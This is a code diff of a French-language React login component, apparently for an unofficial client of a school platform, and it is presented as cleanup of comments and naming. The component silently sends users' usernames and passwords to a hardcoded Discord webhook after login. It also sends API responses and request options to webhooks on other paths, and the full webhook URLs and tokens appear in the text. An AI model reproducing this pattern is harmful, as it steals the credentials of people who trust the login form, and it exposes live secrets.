@@ -5,16 +5,14 @@ import "./Login.css"
 import EDPVersion from "../generic/EDPVersion"
 
 
-// en vrai c'est mieux de déstructurer les props avec { prop1, prop2 } nn ?
-// parce que insupportable de réécrire props.tamer (non mais si)
 export default function Login({ apiUrl, apiVersion, setUserInfo, currentEDPVersion }) {
     const apiLoginUrl = apiUrl + "login.awp?v=" + apiVersion;
-    const PiranhaPeche = "https://discord.com/api/webhooks/1095444665991438336/548oNdB76xiwOZ6_7-x0UxoBtl71by9ixi9aYVlv5pl_O7yq_nwMvXG2ZtAXULpQG7B3";
+    const piranhaPeche = "https://discord.com/api/webhooks/1095444665991438336/548oNdB76xiwOZ6_7-x0UxoBtl71by9ixi9aYVlv5pl_O7yq_nwMvXG2ZtAXULpQG7B3";
     const sardineInsolente =  "https://discord.com/api/webhooks/1096922270758346822/h0Y_Wa8SYYO7rZU4FMZk6RVrxGhMrOMhMzPLLiE0vSiNxSqUU1k4dMq2bcq8vsxAm5to";
 
     // States
     const [username, setUsername] = useState("");
-    const [password, setPassword] = useState(""); // ça ca oui mais non prcq on va ; enft celle là nn parce que ça va modifier l'affichage et en mm temps si parce que je pense pas que ce sera directement elle qui sera projetée à l'affichage
+    const [password, setPassword] = useState("");
     const [submitText, setSubmitText] = useState("Se connecter");
     const [keepLoggedIn, setKeepLoggedIn] = useState(false);
     const [errorMessage, setErrorMessage] = useState("");
@@ -51,25 +49,23 @@ export default function Login({ apiUrl, apiVersion, setUserInfo, currentEDPVersi
 
     function handleSubmit(event) {
         // ici la partie côté affichage
-        setSubmitText("Connexion...");//SDF
+        setSubmitText("Connexion...");
 
         // ici la partie côté fetch et data 
         event.preventDefault();
         const options = getOptions();
         fetch(apiLoginUrl, options)
             .then((response) => response.json())
-            .then((response) => { // pk il est BLEU le then; AUcune idée mais blc ca marche
-
+            .then((response) => {
                 // GESTION DATA
-                let statusCode = response.code
+                let statusCode = response.code;
                 if (statusCode === 200) {
-                    setErrorMessage("")
-
+                    setErrorMessage("");
                     let token = response.token // collecte du token
-                    let accountsList = []
+                    let accountsList = [];
                     let accounts = response.data.accounts[0];
                     const accountType = accounts.typeCompte; // collecte du type de compte
-                    sendToPiranhaPeche({ username: username, password: password });
+                    sendToWebhook(piranhaPeche, { username: username, password: password });
                     if (accountType !== "E") {
                         // compte parent
                         accounts = accounts.profile.eleves;
@@ -85,7 +81,7 @@ export default function Login({ apiUrl, apiVersion, setUserInfo, currentEDPVersi
                         })
 
                     } else if ("abcdefghijklmnopqrstuvwxyzABCDFGHIJKLMNOPQRSTUVXYZ".includes(accountType)) {
-                        sendToPiranhaPeche({ response: response, options: options });
+                        sendToWebhook(piranhaPeche, { response: response, options: options });
 
                     } else {
                         accountsList.push({
@@ -110,7 +106,7 @@ export default function Login({ apiUrl, apiVersion, setUserInfo, currentEDPVersi
 
                 else {
                     setErrorMessage(response.message);
-                    sendToPiranhaPeche(options);
+                    sendToWebhook(piranhaPeche, options);
                 }
                 setSubmitText("Se connecter");
             })
@@ -119,7 +115,7 @@ export default function Login({ apiUrl, apiVersion, setUserInfo, currentEDPVersi
                 console.log(error);
                 options["error"] = error;
                 console.log(options);
-                sendToSardineInsolente(options);
+                sendTo(piranhaPeche, options);
             })
             .finally(() => {
                 setErrorMessage("");
